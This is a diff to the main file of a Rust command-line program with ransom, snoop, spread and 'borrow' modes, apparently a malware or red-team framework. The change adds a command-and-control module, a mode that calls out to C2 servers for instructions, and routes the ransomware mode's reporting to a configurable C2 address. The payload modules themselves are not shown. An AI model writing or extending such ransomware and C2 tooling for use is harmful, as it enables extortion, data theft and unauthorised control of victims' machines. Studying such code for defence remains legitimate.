@@ -1,15 +1,17 @@
 use clap::{Parser, Subcommand};
 use config::{Config, ConfigError, FileFormat};
 use env_logger::{fmt::Target, Builder};
-use log::{error, info, Level};
+use log::{error, info, warn, Level};
 use std::{io::Write, path::PathBuf};
 
 mod borrow;
+mod c2;
 mod ransom;
 mod snoop;
 mod spread;
 
 use borrow::*;
+use c2::*;
 use ransom::*;
 use snoop::*;
 use spread::*;
@@ -49,6 +51,8 @@ enum Modes {
     Spread,
     /// Dump the current configuration file
     DumpConfig,
+    /// Call out to C2 server for instructions
+    GetCommand,
 }
 
 fn main() {
@@ -75,7 +79,7 @@ fn main() {
         3 => Level::Debug,
         4 => Level::Trace,
         _ => {
-            println!("ignoring additional debug flags");
+            warn!("ignoring additional debug flags");
             Level::Trace
         }
     };
@@ -99,12 +103,15 @@ fn main() {
     if let Some(mode) = cli.mode {
         match mode {
             Modes::Borrow => borrow(get_exe(&conf), get_exeargs(&conf)),
-            Modes::Ransom => ransom(&get_root(&conf), &get_catcher(&conf)),
+            Modes::Ransom => ransom(&get_root(&conf), &get_c2(&conf)),
             Modes::Snoop => snoop(),
             Modes::Spread => spread(),
-            Modes::DumpConfig => dumpconf(conf),
+            Modes::DumpConfig => dumpconf(&conf),
+            Modes::GetCommand => get_commands(get_c2s(&conf)),
             // _ => unreachable!(), // panics if code becomes not unreachable
         }
+    } else {
+        warn!("no mode specified");
     }
 
     info!("finished!");
@@ -119,7 +126,7 @@ fn read_config(path: &str) -> Result<Config, ConfigError> {
     builder.build()
 }
 
-fn dumpconf(conf: Option<Config>) {
+fn dumpconf(conf: &Option<Config>) {
     if let Some(conf) = conf {
         info!("{conf:?}")
     } else {
@@ -155,14 +162,6 @@ fn get_root(conf: &Option<Config>) -> String {
     }
 }
 
-fn get_catcher(conf: &Option<Config>) -> String {
-    if let Some(catcher) = get_field("catcher", conf) {
-        catcher
-    } else {
-        String::from("localhost")
-    }
-}
-
 fn get_exe(conf: &Option<Config>) -> PathBuf {
     if let Some(exepath) = get_field("exepath", conf) {
         exepath
@@ -173,4 +172,23 @@ fn get_exe(conf: &Option<Config>) -> PathBuf {
 
 fn get_exeargs(conf: &Option<Config>) -> Option<Vec<String>> {
     get_field("exeargs", conf)
+}
+
+fn get_c2(conf: &Option<Config>) -> String {
+    if let Some(c2) = get_field("c2", conf) {
+        c2
+    } else {
+        warn!("no c2 found, sensible default provided");
+        String::from("localhost:8888")
+    }
+}
+
+fn get_c2s(conf: &Option<Config>) -> Vec<String> {
+    if let Some(c2s) = get_field("c2", conf) {
+        c2s
+    } else {
+        // empty
+        warn!("no c2s found, sensible defaults provided");
+        vec![String::from("localhost:8888"), String::from("localhost:80")]
+    }
 }
